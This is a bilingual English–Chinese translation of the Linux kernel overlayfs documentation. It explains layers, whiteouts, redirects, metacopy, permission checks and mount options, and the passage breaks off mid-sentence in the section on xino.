[{"body":"本文原文来自内核源码文档，源码链接。\n官方网站：https://docs.kernel.org\nOverlay文件系统（Overlay Filesystem） This document describes a prototype for a new approach to providing overlay-filesystem functionality in Linux (sometimes referred to as union-filesystems). An overlay-filesystem tries to present a filesystem which is the result over overlaying one filesystem on top of the other.\n本文档描述了在 Linux 中提供Overlay(覆盖)文件系统功能（有时称为联合文件系统）的新方法的原型。 Overlay文件系统尝试呈现一种文件系统，该文件系统是将一个文件系统覆盖在另一个文件系统之上的结果。\nOverlay对象 （Overlay objects） The overlay filesystem approach is 'hybrid', because the objects that appear in the filesystem do not always appear to belong to that filesystem. In many cases, an object accessed in the union will be indistinguishable from accessing the corresponding object from the original filesystem. This is most obvious from the 'st_dev' field returned by stat(2).\nWhile directories will report an st_dev from the overlay-filesystem, non-directory objects may report an st_dev from the lower filesystem or upper filesystem that is providing the object. Similarly st_ino will only be unique when combined with st_dev, and both of these can change over the lifetime of a non-directory object. Many applications and tools ignore these values and will not be affected.\nOverlay文件系统方法是“混合”的，因为文件系统中出现的对象看起来并不总是属于该文件系统。 在许多情况下，在联合中访问的对象与从原始文件系统访问相应的对象没有什么区别。 这在 stat(2) 返回的“st_dev”字段中最为明显。\n虽然目录将报告来自覆盖文件系统的 st_dev，但非目录对象可能会报告来自提供该对象的下层文件系统或上层文件系统的 st_dev。 类似地，st_ino 仅在与 st_dev 组合时才是唯一的，并且这两者都可以在非目录对象的生命周期中发生变化。 许多应用程序和工具会忽略这些值并且不会受到影响。\nIn the special case of all overlay layers on the same underlying filesystem, all objects will report an st_dev from the overlay filesystem and st_ino from the underlying filesystem. This will make the overlay mount more compliant with filesystem scanners and overlay objects will be distinguishable from the corresponding objects in the original filesystem.\nOn 64bit systems, even if all overlay layers are not on the same underlying filesystem, the same compliant behavior could be achieved with the \u0026quot;xino\u0026quot; feature. The \u0026quot;xino\u0026quot; feature composes a unique object identifier from the real object st_ino and an underlying fsid index. The \u0026quot;xino\u0026quot; feature uses the high inode number bits for fsid, because the underlying filesystems rarely use the high inode number bits. In case the underlying inode number does overflow into the high xino bits, overlay filesystem will fall back to the non xino behavior for that inode.\nThe \u0026quot;xino\u0026quot; feature can be enabled with the \u0026quot;-o xino=on\u0026quot; overlay mount option. If all underlying filesystems support NFS file handles, the value of st_ino for overlay filesystem objects is not only unique, but also persistent over the lifetime of the filesystem. The \u0026quot;-o xino=auto\u0026quot; overlay mount option enables the \u0026quot;xino\u0026quot; feature only if the persistent st_ino requirement is met.\n在所有覆盖层都位于同一底层文件系统上的特殊情况下，所有对象都将报告来自覆盖文件系统的 st_dev 和来自底层文件系统的 st_ino 。 这将使覆盖挂载更符合文件系统扫描器的要求，并且覆盖对象将与原始文件系统中的相应对象区分开来。\n在 64 位系统上，即使所有覆盖层不在同一底层文件系统上，也可以通过“xino”功能实现相同的合规行为。 “xino”功能由真实对象 st_ino 的唯一对象标识符和底层 fsid 索引组成。 “xino”功能使用 fsid 的高 inode 编号位，因为底层文件系统很少使用高 inode 编号位。 如果底层 inode 编号确实溢出到高 xino 位，覆盖文件系统将回退到该 inode 的非 xino 行为。\n可以使用“-o xino=on”overlay挂载选项启用“xino”特性。 如果所有底层文件系统都支持 NFS 文件句柄，则Overlay文件系统对象的 st_ino 值不仅是唯一的，而且在文件系统的生命周期内是持久的。 仅当满足持久 st_ino 要求时，“-o xino=auto” overlay挂载选项才会启用“xino”功能。\nThe following table summarizes what can be expected in different overlay configurations.\n下表总结了不同overlay配置下的预期结果。\nInode属性（Inode properties） 配置\n持久化st_ino\n统一的st_dev\nst_ino == d_ino\nd_ino == i_ino [*]\ndir\n!dir\ndir\n!dir\ndir\n!dir\ndir\n!dir\n所有的层在同一个文件系统上\nY\nY\nY\nY\nY\nY\nY\nY\n所有层在同一文件系统上, xino=off\nN\nN\nY\nN\nN\nY\nN\nY\nxino=on/auto\nY\nY\nY\nY\nY\nY\nY\nY\nxino=on/auto, ino 溢出\nN\nN\nY\nN\nN\nY\nN\nY\n[*] nfsd v3 readdirplus verifies d_ino == i_ino. i_ino is exposed via several /proc files, such as /proc/locks and /proc/self/fdinfo/\u0026lt;fd\u0026gt; of an inotify file descriptor.\n注：nfsd v3 readdirplus 验证 d_ino == i_ino。 i_ino 通过多个 /proc 文件暴露，例如 inotify 文件描述符的 /proc/locks 和 /proc/self/fdinfo/\u0026lt;fd\u0026gt; 。\n上层和下层（Upper and Lower） An overlay filesystem combines two filesystems - an 'upper' filesystem and a 'lower' filesystem. When a name exists in both filesystems, the object in the 'upper' filesystem is visible while the object in the 'lower' filesystem is either hidden or, in the case of directories, merged with the 'upper' object.\nIt would be more correct to refer to an upper and lower 'directory tree' rather than 'filesystem' as it is quite possible for both directory trees to be in the same filesystem and there is no requirement that the root of a filesystem be given for either upper or lower.\nOverlay文件系统结合了两个文件系统——“上层”文件系统和“下层”文件系统。 当两个文件系统中都存在某个名字时，“上层”文件系统中的对象可见，而“下层”文件系统中的对象被隐藏，对目录来说则会与“上层”对象合并。\n更准确的说法，上层和下层是“目录树”而不是“文件系统”，因为两个目录树很可能位于同一文件系统中，并且并不需要将文件系统的根目录给到上层或下层。\n（译者注：上层和下层可以指定某个文件系统的某个目录，不需要一定要将文件系统的/目录给到某一层）\nA wide range of filesystems supported by Linux can be the lower filesystem, but not all filesystems that are mountable by Linux have the features needed for OverlayFS to work. The lower filesystem does not need to be writable. The lower filesystem can even be another overlayfs. The upper filesystem will normally be writable and if it is it must support the creation of trusted.* and/or user.* extended attributes, and must provide valid d_type in readdir responses, so NFS is not suitable.\nA read-only overlay of two read-only filesystems may use any filesystem type.\nLinux 支持的多种文件系统都可以是下层文件系统，但并非所有 Linux 可挂载的文件系统都具有 OverlayFS 工作所需的特性。 下层文件系统不需要是可写的。 下层文件系统甚至可以是另一个overlayfs。 上层文件系统通常是可写的，如果是的话，它必须支持创建 trust.* 和/或 user.* 扩展属性，并且必须在 readdir 响应中提供有效的 d_type，因此 NFS 不符合。\n两个只读文件系统组成的只读overlay fs可以使用任何文件系统类型。\n目录（Directories） Overlaying mainly involves directories. If a given name appears in both upper and lower filesystems and refers to a non-directory in either, then the lower object is hidden - the name refers only to the upper object.\nWhere both upper and lower objects are directories, a merged directory is formed.\nAt mount time, the two directories given as mount options \u0026quot;lowerdir\u0026quot; and \u0026quot;upperdir\u0026quot; are combined into a merged directory:\n覆盖主要涉及目录。 如果给定名称同时出现在上层和下层文件系统中，并且指向任一文件系统中的非目录项，则下层对象将被隐藏 - 该名称仅引用上层对象。\n当上层和下层对象都是目录时，就形成一个合并目录。\n在挂载时，通过挂载选项“lowerdir”和“upperdir”指定的两个目录将组合成一个合并目录：\n1mount -t overlay overlay -olowerdir=/lower,upperdir=/upper,workdir=/work /merged The \u0026quot;workdir\u0026quot; needs to be an empty directory on the same filesystem as upperdir.\nThen whenever a lookup is requested in such a merged directory, the lookup is performed in each actual directory and the combined result is cached in the dentry belonging to the overlay filesystem. If both actual lookups find directories, both are stored and a merged directory is created, otherwise only one is stored: the upper if it exists, else the lower.\nOnly the lists of names from directories are merged. Other content such as metadata and extended attributes are reported for the upper directory only. These attributes of the lower directory are hidden.\n“workdir”必须是与 upperdir 位于同一文件系统上的空目录。\n然后，每当在这样的合并目录中执行查找动作时，都会在每个实际目录中执行查找，并将组合结果缓存在属于overlay文件系统的 dentry 中。 如果两层都找到目录，则两个目录都会被存储并创建一个合并目录，否则仅存储一个目录：如果上层存在则为上层目录，否则为下层目录。\n仅合并目录中的名称列表。 其他内容（例如元数据和扩展属性）仅报告上层目录的。 下层目录的这些属性是隐藏的。\nwhiteout和不透明目录（whiteouts and opaque directories） （译者注：whiteout没有找到广受认可的翻译，单独翻译单词有”白化“，”临时性失明“，\u0026quot;涂改液\u0026quot;的意思，我认为”涂改“是个不错的翻译。为保持准确，以下直接使用whiteout而不做翻译）\nIn order to support rm and rmdir without changing the lower filesystem, an overlay filesystem needs to record in the upper filesystem that files have been removed. This is done using whiteouts and opaque directories (non-directories are always opaque).\n为了在不更改下层文件系统的情况下支持 rm 和 rmdir，overlay文件系统需要在上层文件系统中记录文件已被删除。 这是通过使用whiteouts和不透明目录来完成的（非目录总是不透明的）。\nA whiteout is created as a character device with 0/0 device number. When a whiteout is found in the upper level of a merged directory, any matching name in the lower level is ignored, and the whiteout itself is also hidden.\nwhiteout以具有 0/0 设备号的字符设备的形态创建。 当在合并目录的上层发现whiteout时，下层中任何匹配的名称都会被忽略，并且whiteout本身也会被隐藏。\nA directory is made opaque by setting the xattr \u0026quot;trusted.overlay.opaque\u0026quot; to \u0026quot;y\u0026quot;. Where the upper filesystem contains an opaque directory, any directory in the lower filesystem with the same name is ignored.\n通过将扩展属性（xattr）“trusted.overlay.opaque”设置为“y”，目录可以变得不透明。 如果上层文件系统包含一个不透明目录，则下层文件系统中的任何同名目录都会被忽略。\nreaddir（readdir） When a 'readdir' request is made on a merged directory, the upper and lower directories are each read and the name lists merged in the obvious way (upper is read first, then lower - entries that already exist are not re-added). This merged name list is cached in the 'struct file' and so remains as long as the file is kept open. If the directory is opened and read by two processes at the same time, they will each have separate caches. A seekdir to the start of the directory (offset 0) followed by a readdir will cause the cache to be discarded and rebuilt.\n当对合并目录发出“readdir”请求时，将分别读取上层目录和下层目录，并以明显的方式合并名称列表（首先读取上层目录，然后读取下层目录 -- 不会重新添加已存在的条目）。 此合并的名称列表缓存在'struct file'结构体中，因此只要文件保持打开状态，该列表就会保留下来。 如果目录同时被两个进程打开和读取，它们将各自拥有单独的缓存。 对目录开头（偏移量 0）执行 seekdir，然后再次readdir 将导致缓存被丢弃并重建。\nThis means that changes to the merged directory do not appear while a directory is being read. This is unlikely to be noticed by many programs.\n这意味着目录正在被读取时对合并目录进行的更改不会显示出来。 许多程序不太可能注意到这一点。\nseek offsets are assigned sequentially when the directories are read. Thus if\nread part of a directory remember an offset, and close the directory re-open the directory some time later seek to the remembered offset there may be little correlation between the old and new locations in the list of filenames, particularly if anything has changed in the directory.\nReaddir on directories that are not merged is simply handled by the underlying directory (upper or lower).\n读取目录时，将按顺序分配查找偏移量。 因此如果\n读取目录的一部分 记住偏移量，然后关闭目录 稍后重新打开目录 寻找记住的偏移量 文件名列表中的旧位置和新位置之间可能几乎没有相关性，特别是当目录中发生任何更改时。\n未合并目录上的 Readdir 仅由底层目录（上层或下层）处理。\n重命名目录（renaming directories） When renaming a directory that is on the lower layer or merged (i.e. the directory was not created on the upper layer to start with) overlayfs can handle it in two different ways:\nreturn EXDEV error: this error is returned by rename(2) when trying to move a file or directory across filesystem boundaries. Hence applications are usually prepared to hande this error (mv(1) for example recursively copies the directory tree). This is the default behavior.\nIf the \u0026quot;redirect_dir\u0026quot; feature is enabled, then the directory will be copied up (but not the contents). Then the \u0026quot;trusted.overlay.redirect\u0026quot; extended attribute is set to the path of the original location from the root of the overlay. Finally the directory is moved to the new location.\nThere are several ways to tune the \u0026quot;redirect_dir\u0026quot; feature.\n当重命名位于下层或合并的目录时（即该目录不是在上层开始创建的），overlayfs 可以通过两种不同的方式处理它：\n返回 EXDEV 错误：当尝试跨文件系统边界移动文件或目录时，rename(2) 返回此错误。 因此，应用程序通常都会做好准备处理此错误（例如 mv(1) 递归复制目录树）。 这是默认行为。\n如果启用了“redirect_dir”功能，则将向上复制目录（但不复制内容）。 然后，“trusted.overlay.redirect”扩展属性被设置为从overlay的根开始的原始位置的路径。 最后该目录被移动到新位置。\n有多种方法可以调整“redirect_dir”功能。\nKernel config options:\nOVERLAY_FS_REDIRECT_DIR: If this is enabled, then redirect_dir is turned on by default.\nOVERLAY_FS_REDIRECT_ALWAYS_FOLLOW: If this is enabled, then redirects are always followed by default. Enabling this results in a less secure configuration. Enable this option only when worried about backward compatibility with kernels that have the redirect_dir feature and follow redirects even if turned off.\n内核配置选项：\nOVERLAY_FS_REDIRECT_DIR： 如果启用此选项，则默认情况下将打开redirect_dir。\nOVERLAY_FS_REDIRECT_ALWAYS_FOLLOW： 如果启用此功能，则默认情况下始终跟随重定向。 启用此功能会导致配置安全性降低。 仅当你关心与具有redirect_dir 功能的内核的向后兼容问题时才启用此选项，并且即使目录重定向被关闭也依然跟随重定向。\n（译者注：”跟随重定向“应该指的是寻着”重定向扩展属性“去找到原目录或文件）\nModule options (can also be changed through /sys/module/overlay/parameters/):\n\u0026quot;redirect_dir=BOOL\u0026quot;: See OVERLAY_FS_REDIRECT_DIR kernel config option above.\n\u0026quot;redirect_always_follow=BOOL\u0026quot;: See OVERLAY_FS_REDIRECT_ALWAYS_FOLLOW kernel config option above.\n\u0026quot;redirect_max=NUM\u0026quot;: The maximum number of bytes in an absolute redirect (default is 256).\n模块选项（也可以通过/sys/module/overlay/parameters/更改）：\n“redirect_dir=BOOL”： 请参阅上面的 OVERLAY_FS_REDIRECT_DIR 内核配置选项。\n“redirect_always_follow=BOOL”： 请参阅上面的 OVERLAY_FS_REDIRECT_ALWAYS_FOLLOW 内核配置选项。\n“redirect_max=NUM”： 绝对重定向中的最大字节数（默认为 256）。\nMount options:\n\u0026quot;redirect_dir=on\u0026quot;: Redirects are enabled.\n\u0026quot;redirect_dir=follow\u0026quot;: Redirects are not created, but followed.\n\u0026quot;redirect_dir=nofollow\u0026quot;: Redirects are not created and not followed.\n\u0026quot;redirect_dir=off\u0026quot;: If \u0026quot;redirect_always_follow\u0026quot; is enabled in the kernel/module config, this \u0026quot;off\u0026quot; traslates to \u0026quot;follow\u0026quot;, otherwise it translates to \u0026quot;nofollow\u0026quot;.\n挂载选项：\n“redirect_dir=on”： 重定向已启用。\n“redirect_dir=follow”： 重定向不会创建，但是会跟随。\n“redirect_dir=nofollow”： 重定向不会创建也不跟随。\n“redirect_dir=off”： 如果在内核/模块配置中启用了“redirect_always_follow”，则此“off”将转换为“follow”，否则它将转换为“nofollow”。\nWhen the NFS export feature is enabled, every copied up directory is indexed by the file handle of the lower inode and a file handle of the upper directory is stored in a \u0026quot;trusted.overlay.upper\u0026quot; extended attribute on the index entry. On lookup of a merged directory, if the upper directory does not match the file handle stores in the index, that is an indication that multiple upper directories may be redirected to the same lower directory. In that case, lookup returns an error and warns about a possible inconsistency.\nBecause lower layer redirects cannot be verified with the index, enabling NFS export support on an overlay filesystem with no upper layer requires turning off redirect follow (e.g. \u0026quot;redirect_dir=nofollow\u0026quot;).\n当启用 NFS 导出功能时，每个向上拷贝的目录都会通过下层 inode 的文件句柄进行索引，上层目录的文件句柄存储在索引条目上的“trusted.overlay.upper”扩展属性中。 在查找合并目录时，如果上层目录与索引中的文件句柄存储不匹配，则表明多个上层目录可能被重定向到同一个下层目录。 在这种情况下，查找操作会返回错误并警告可能存在的不一致。\n由于无法使用索引验证下层重定向，因此在没有上层的覆盖文件系统上启用 NFS 导出支持需要关闭重定向跟随（例如“redirect_dir=nofollow”）。\n非目录（Non-directories） Objects that are not directories (files, symlinks, device-special files etc.) are presented either from the upper or lower filesystem as appropriate. When a file in the lower filesystem is accessed in a way the requires write-access, such as opening for write access, changing some metadata etc., the file is first copied from the lower filesystem to the upper filesystem (copy_up). Note that creating a hard-link also requires copy_up, though of course creation of a symlink does not.\n非目录的对象（文件、符号链接、设备专用文件等）根据需要从上层或下层文件系统中呈现。 当需要以写访问的方式访问下层文件系统中的文件时，例如写访问的方式打开、更改某些元数据等，该文件首先从下层文件系统复制到上层文件系统（向上拷贝，copy_up）。 请注意，创建硬链接也需要 copy_up，但创建符号链接并不需要。\nThe copy_up may turn out to be unnecessary, for example if the file is opened for read-write but the data is not modified.\ncopy_up 可能是不必要的，例如，如果文件以读写方式打开，但数据并未修改。\nThe copy_up process first makes sure that the containing directory exists in the upper filesystem - creating it and any parents as necessary. It then creates the object with the same metadata (owner, mode, mtime, symlink-target etc.) and then if the object is a file, the data is copied from the lower to the upper filesystem. Finally any extended attributes are copied up.\ncopy_up 进程首先确保文件所在目录存在于上层文件系统中 - 创建它以及根据需要创建任何父目录。 然后，它使用相同的元数据（所有者、模式、修改时间、符号链接目标等）创建对象，然后如果该对象是文件，则将数据从下层文件系统复制到上层文件系统。 最后，所有扩展属性都会被复制。\nOnce the copy_up is complete, the overlay filesystem simply provides direct access to the newly created file in the upper filesystem - future operations on the file are barely noticed by the overlay filesystem (though an operation on the name of the file such as rename or unlink will of course be noticed and handled).\n一旦 copy_up 完成，覆盖文件系统只提供对上层文件系统中新创建的文件的直接访问 - 覆盖文件系统几乎不会注意到未来对该文件的操作（尽管对文件名的操作，例如重命名或取消链接） 当然会被注意到并处理）。\n权限模型（Permission model） Permission checking in the overlay filesystem follows these principles:\npermission check SHOULD return the same result before and after copy up\ntask creating the overlay mount MUST NOT gain additional privileges\nnon-mounting task MAY gain additional privileges through the overlay, compared to direct access on underlying lower or upper filesystems\nOverlay文件系统中的权限检查遵循以下原则：\n权限检查应该在复制之前和之后返回相同的结果\n创建overlay挂载的任务不得获得额外的权限\n与直接访问底层或上层文件系统相比，非挂载任务可以通过覆盖获得额外的权限\nThis is achieved by performing two permission checks on each access\na. check if current task is allowed access based on local DAC (owner, group, mode and posix acl), as well as MAC checks\nb. check if mounting task would be allowed real operation on lower or upper layer based on underlying filesystem permissions, again including MAC checks\n这是通过对每次访问执行两次权限检查来实现的\na. 根据本地 DAC（所有者、组、模式和 posix acl）以及 MAC 检查当前任务是否允许访问\nb. 根据底层文件系统权限检查挂载任务是否允许在下层或上层进行实际操作，同样包括 MAC 检查\nCheck (a) ensures consistency (1) since owner, group, mode and posix acls are copied up. On the other hand it can result in server enforced permissions (used by NFS, for example) being ignored (3).\nCheck (b) ensures that no task gains permissions to underlying layers that the mounting task does not have (2). This also means that it is possible to create setups where the consistency rule (1) does not hold; normally, however, the mounting task will have sufficient privileges to perform all operations.\n检查 (a) 确保一致性 (1)，因为所有者、组、模式和 posix acl 被复制。 另一方面，它可能会导致服务器强制执行的权限（例如，由 NFS 使用）被忽略 (3)。\n检查 (b) 确保没有任务获得挂载任务所没有的底层权限（2）。 这也意味着可以创建不满足一致性规则 (1) 的设置； 但是，通常情况下，挂载任务将具有足够的权限来执行所有操作。\nAnother way to demonstrate this model is drawing parallels between\n演示该模型的另一种方法是类比以下两种方式：\n1mount -t overlay overlay -olowerdir=/lower,upperdir=/upper,... /merged and\n和\n1cp -a /lower /upper \u0026amp;\u0026amp; mount --bind /upper /merged （译者注：原文是cp -a /lower /upper mount --bind /upper /merged , 我认为是漏了\u0026amp;\u0026amp;）\nThe resulting access permissions should be the same. The difference is in the time of copy (on-demand vs. up-front).\n两种方式生成的访问权限应该是相同的。 区别在于发生复制的时间（按需复制与预先复制）。\n多个下层（Multiple lower layers） Multiple lower layers can now be given using the colon (\u0026quot;:\u0026quot;) as a separator character between the directory names. For example:\n可以使用冒号（“：”）作为目录名称之间的分隔符来指定多个下层。 例如：\n1mount -t overlay overlay -olowerdir=/lower1:/lower2:/lower3 /merged As the example shows, \u0026quot;upperdir=\u0026quot; and \u0026quot;workdir=\u0026quot; may be omitted. In that case the overlay will be read-only.\nThe specified lower directories will be stacked beginning from the rightmost one and going left. In the above example lower1 will be the top, lower2 the middle and lower3 the bottom layer.\n如示例所示，“upperdir=”和“workdir=”可以省略。 在这种情况下，overlay fs将是只读的。\n指定的下级目录将从最右边的目录开始向左堆叠。 在上面的例子中，lower1 是顶层，lower2 是中间层，lower3 是底层。\n仅向上拷贝元数据 (Metadata only copy up) When metadata only copy up feature is enabled, overlayfs will only copy up metadata (as opposed to whole file), when a metadata specific operation like chown/chmod is performed. Full file will be copied up later when file is opened for WRITE operation.\nIn other words, this is delayed data copy up operation and data is copied up when there is a need to actually modify data.\n当启用仅向上拷贝元数据功能时，当执行 chown/chmod 等元数据特定操作时，overlayfs 将仅复制元数据（而不是整个文件）。 当文件打开进行写操作时，完整的文件将被复制。\n换句话说，这是延迟数据复制操作，当需要实际修改数据时才复制数据。\nThere are multiple ways to enable/disable this feature. A config option CONFIG_OVERLAY_FS_METACOPY can be set/unset to enable/disable this feature by default. Or one can enable/disable it at module load time with module parameter metacopy=on/off. Lastly, there is also a per mount option metacopy=on/off to enable/disable this feature per mount.\n有多种方法可以启用/禁用此功能。 可以通过设置/取消设置配置选项 CONFIG_OVERLAY_FS_METACOPY 以默认启用/禁用此功能。 或者可以在模块加载时使用模块参数 metacopy=on/off 启用/禁用它。 最后，可以在每个挂载时指定挂载选项 metacopy=on/off 来启用/禁用功能。\nDo not use metacopy=on with untrusted upper/lower directories. Otherwise it is possible that an attacker can create a handcrafted file with appropriate REDIRECT and METACOPY xattrs, and gain access to file on lower pointed by REDIRECT. This should not be possible on local system as setting \u0026quot;trusted.\u0026quot; xattrs will require CAP_SYS_ADMIN. But it should be possible for untrusted layers like from a pen drive.\n不要对不受信任的上层/下层目录使用metacopy=on。 否则，攻击者可能会使用适当的 REDIRECT 和 METACOPY xattrs 手工创建文件，并获得 REDIRECT 指向的下层文件的访问权限。 这在本地系统上应该是不可能的，因为设置\u0026quot;trusted.\u0026quot; xattrs 将需要 CAP_SYS_ADMIN 权限。 但对于不受信任的层（例如pen drive）应该是可能的。\nNote: redirect_dir={off|nofollow|follow[*]} and nfs_export=on mount options conflict with metacopy=on, and will result in an error.\n[*] redirect_dir=follow only conflicts with metacopy=on if upperdir=... is given.\n注意：redirect_dir={off|nofollow|follow[*]} 和 nfs_export=on 挂载选项与 metacopy=on 冲突，并会导致错误。\n[*] 如果给出了 upperdir=...，redirect_dir=follow 仅与 metacopy=on 冲突。\n只含数据的下层（Data-only lower layers） With \u0026quot;metacopy\u0026quot; feature enabled, an overlayfs regular file may be a composition of information from up to three different layers:\nmetadata from a file in the upper layer st_ino and st_dev object identifier from a file in a lower layer data from a file in another lower layer (further below) 启用“元复制”功能后，overlayfs 常规文件可能是来自最多三个不同层的信息的组合：\n来自上层文件的元数据 下层文件中的 st_ino 和 st_dev 对象标识符 来自另一个下层（更下面）的文件的数据 The \u0026quot;lower data\u0026quot; file can be on any lower layer, except from the top most lower layer.\nBelow the top most lower layer, any number of lower most layers may be defined as \u0026quot;data-only\u0026quot; lower layers, using double colon (\u0026quot;::\u0026quot;) separators. A normal lower layer is not allowed to be below a data-only layer, so single colon separators are not allowed to the right of double colon (\u0026quot;::\u0026quot;) separators.\nFor example:\n“下层数据”文件可以位于任何下层，除了最顶层的下层。\n在最顶层的下层之下，可以使用双冒号（“::”）分隔符将任意数量的最下层定义为“仅数据”下层。 普通下层不允许位于“仅数据”层下方，因此单冒号分隔符不允许位于双冒号（“::”）分隔符的右侧。\n例如：\n1mount -t overlay overlay -olowerdir=/l1:/l2:/l3::/do1::/do2 /merged The paths of files in the \u0026quot;data-only\u0026quot; lower layers are not visible in the merged overlayfs directories and the metadata and st_ino/st_dev of files in the \u0026quot;data-only\u0026quot; lower layers are not visible in overlayfs inodes.\nOnly the data of the files in the \u0026quot;data-only\u0026quot; lower layers may be visible when a \u0026quot;metacopy\u0026quot; file in one of the lower layers above it, has a \u0026quot;redirect\u0026quot; to the absolute path of the \u0026quot;lower data\u0026quot; file in the \u0026quot;data-only\u0026quot; lower layer.\n“仅数据”下层中的文件路径在合并的overlayfs目录中不可见，并且“仅数据”下层中的文件的元数据和st_ino/st_dev在overlayfs inode中不可见。\n当其上方的下层之一中的“元复制”文件，“重定向”到了“仅数据”下层中的“下层数据”文件的绝对路径时，“仅数据”下层中的文件的数据才有可能是可见的。\n共享和复制层（Sharing and copying layers） Lower layers may be shared among several overlay mounts and that is indeed a very common practice. An overlay mount may use the same lower layer path as another overlay mount and it may use a lower layer path that is beneath or above the path of another overlay lower layer path.\nUsing an upper layer path and/or a workdir path that are already used by another overlay mount is not allowed and may fail with EBUSY. Using partially overlapping paths is not allowed and may fail with EBUSY. If files are accessed from two overlayfs mounts which share or overlap the upper layer and/or workdir path the behavior of the overlay is undefined, though it will not result in a crash or deadlock.\nMounting an overlay using an upper layer path, where the upper layer path was previously used by another mounted overlay in combination with a different lower layer path, is allowed, unless the \u0026quot;inodes index\u0026quot; feature or \u0026quot;metadata only copy up\u0026quot; feature is enabled.\n下层可以在多个overlay挂载之间共享，这其实是一种非常常见的做法。 一个overlay挂载可以使用与另一个overlay挂载相同的下层路径，并且它可以使用在另一个overlay下层路径之下或之上的下层路径。\n不允许使用已被另一个overlay挂载使用的上层路径和/或 workdir 路径，并且可能会返回 EBUSY 错误。 不允许使用部分重叠的路径，它可能返回 EBUSY 错误。 如果从共享或重叠上层和/或workdir路径的两个overlayfs挂载访问文件，则覆盖的行为是未定义的，尽管它不会导致崩溃或死锁。\n使用某一个上层路径挂载overlay，这个上层路径先前已经与不同的下层路径组合起来，被另一个挂载的overlay使用过了，这种情况是被允许的，除非启用了“inode 索引”功能或“仅向上复制元数据”功能 。\nWith the \u0026quot;inodes index\u0026quot; feature, on the first time mount, an NFS file handle of the lower layer root directory, along with the UUID of the lower filesystem, are encoded and stored in the \u0026quot;trusted.overlay.origin\u0026quot; extended attribute on the upper layer root directory. On subsequent mount attempts, the lower root directory file handle and lower filesystem UUID are compared to the stored origin in upper root directory. On failure to verify the lower root origin, mount will fail with ESTALE. An overlayfs mount with \u0026quot;inodes index\u0026quot; enabled will fail with EOPNOTSUPP if the lower filesystem does not support NFS export, lower filesystem does not have a valid UUID or if the upper filesystem does not support extended attributes.\nFor \u0026quot;metadata only copy up\u0026quot; feature there is no verification mechanism at mount time. So if same upper is mounted with different set of lower, mount probably will succeed but expect the unexpected later on. So don't do it.\nIt is quite a common practice to copy overlay layers to a different directory tree on the same or different underlying filesystem, and even to a different machine. With the \u0026quot;inodes index\u0026quot; feature, trying to mount the copied layers will fail the verification of the lower root file handle.\n通过“inodes索引”功能，在第一次挂载时，下层根目录的NFS文件句柄，以及下层文件系统的UUID，被编码并存储在上层根目录的“trusted.overlay.origin”扩展属性中。 在随后的挂载尝试中，会将下层根目录文件句柄和下层文件系统 UUID 与上层根目录中存储的源进行比较。 如果无法验证较低的根原点，挂载将失败并报 ESTALE 错误。 如果下层文件系统不支持 NFS 导出、下层文件系统没有有效的 UUID 或者上层文件系统不支持扩展属性，启用“inodes 索引”的 Overlayfs 挂载将会失败并报 EOPNOTSUPP 错误。\n对于“仅向上复制元数据”功能，挂载时没有验证机制。 因此，如果相同上层的与不同的下层一起挂载，挂载可能会成功，但稍后会出现非预期的状况。 所以不要这样做。\n将覆盖层复制到相同或不同底层文件系统上的不同目录树，甚至复制到不同的机器是很常见的做法。 使用“inodes索引”功能，尝试挂载复制的层将无法验证较低的根文件句柄。\n非标准行为（Non-standard behavior） Current version of overlayfs can act as a mostly POSIX compliant filesystem.\nThis is the list of cases that overlayfs doesn't currently handle:\na) POSIX mandates updating st_atime for reads. This is currently not done in the case when the file resides on a lower layer.\nb) If a file residing on a lower layer is opened for read-only and then memory mapped with MAP_SHARED, then subsequent changes to the file are not reflected in the memory mapping.\nc) If a file residing on a lower layer is being executed, then opening that file for write or truncating the file will not be denied with ETXTBSY.\n当前版本的overlayfs 文件系统可以基本兼容POSIX。\n这是overlayfs 当前不处理的情况列表：\na) POSIX 强制在读文件时更新 st_atime。 当文件驻留在较低层时，当前不执行此操作。\nb) 如果驻留在下层的文件以只读方式打开，然后使用 MAP_SHARED 映射内存，则对该文件的后续更改不会反映在内存映射中。\nc) 如果正在执行驻留在下层的文件，则打开该文件进行写入，或截断该文件将不会被以 ETXTBSY 错误拒绝。\nThe following options allow overlayfs to act more like a standards compliant filesystem:\n\u0026quot;redirect_dir\u0026quot; Enabled with the mount option or module option: \u0026quot;redirect_dir=on\u0026quot; or with the kernel config option CONFIG_OVERLAY_FS_REDIRECT_DIR=y.\nIf this feature is disabled, then rename(2) on a lower or merged directory will fail with EXDEV (\u0026quot;Invalid cross-device link\u0026quot;).\n以下选项允许overlayfs更像一个符合标准的文件系统：\n“重定向目录” 使用挂载选项或模块选项启用：“redirect_dir=on”或使用内核配置选项 CONFIG_OVERLAY_FS_REDIRECT_DIR=y。\n如果禁用此功能，则下层目录或合并目录上的 rename(2) 将失败并显示 EXDEV（“无效的跨设备链接”）。\n\u0026quot;inode index\u0026quot; Enabled with the mount option or module option \u0026quot;index=on\u0026quot; or with the kernel config option CONFIG_OVERLAY_FS_INDEX=y.\nIf this feature is disabled and a file with multiple hard links is copied up, then this will \u0026quot;break\u0026quot; the link. Changes will not be propagated to other names referring to the same inode.\n\u0026quot;inode 索引\u0026quot; 使用挂载选项或模块选项“index=on”或使用内核配置选项 CONFIG_OVERLAY_FS_INDEX=y 启用。\n如果禁用此功能并且复制具有多个硬链接的文件，则这将“破坏”链接。 更改不会传播到引用同一 inode 的其他名称。\n\u0026quot;xino\u0026quot; Enabled with the mount option \u0026quot;xino=auto\u0026quot; or \u0026quot;xino=on\u0026quot;, with the module option \u0026quot;xino_auto=on\u0026quot; or with the kernel config option CONFIG_OVERLAY_FS_XINO_AUTO=y. Also implicitly enabled by using the same underlying filesystem for all layers making up the overlay.\nIf this feature is disabled or the underlying filesystem doesn't have enough free bits in the inode number, then overlayfs will not be able to guarantee that the values of st_ino and st_dev returned by stat(2) and the value of d_ino returned by readdir(3) will act like on a normal filesystem. E.g. the value of st_dev may be different for two objects in the same overlay filesystem and the value of st_ino for filesystem objects may not be persistent and could change even while the overlay filesystem is mounted, as summarized in the Inode properties table above.\n“xino” 通过挂载选项“xino=auto”或“xino=on”、模块选项“xino_auto=on”或内核配置选项 CONFIG_OVERLAY_FS_XINO_AUTO=y 启用。 还可以通过对构成overlay的所有层使用相同的底层文件系统来隐式启用。\n如果禁用此功能或底层文件系统的 inode 编号中没有足够的空闲位，则overlayfs将无法保证 stat(2) 返回的 st_ino 和 st_dev 的值以及 readdir(3) 返回的 d_ino 的值与在普通文件系统上的表现一致。 例如，对于同一overlay文件系统中的两个对象，st_dev 的值可能不同，并且文件系统对象的 st_ino 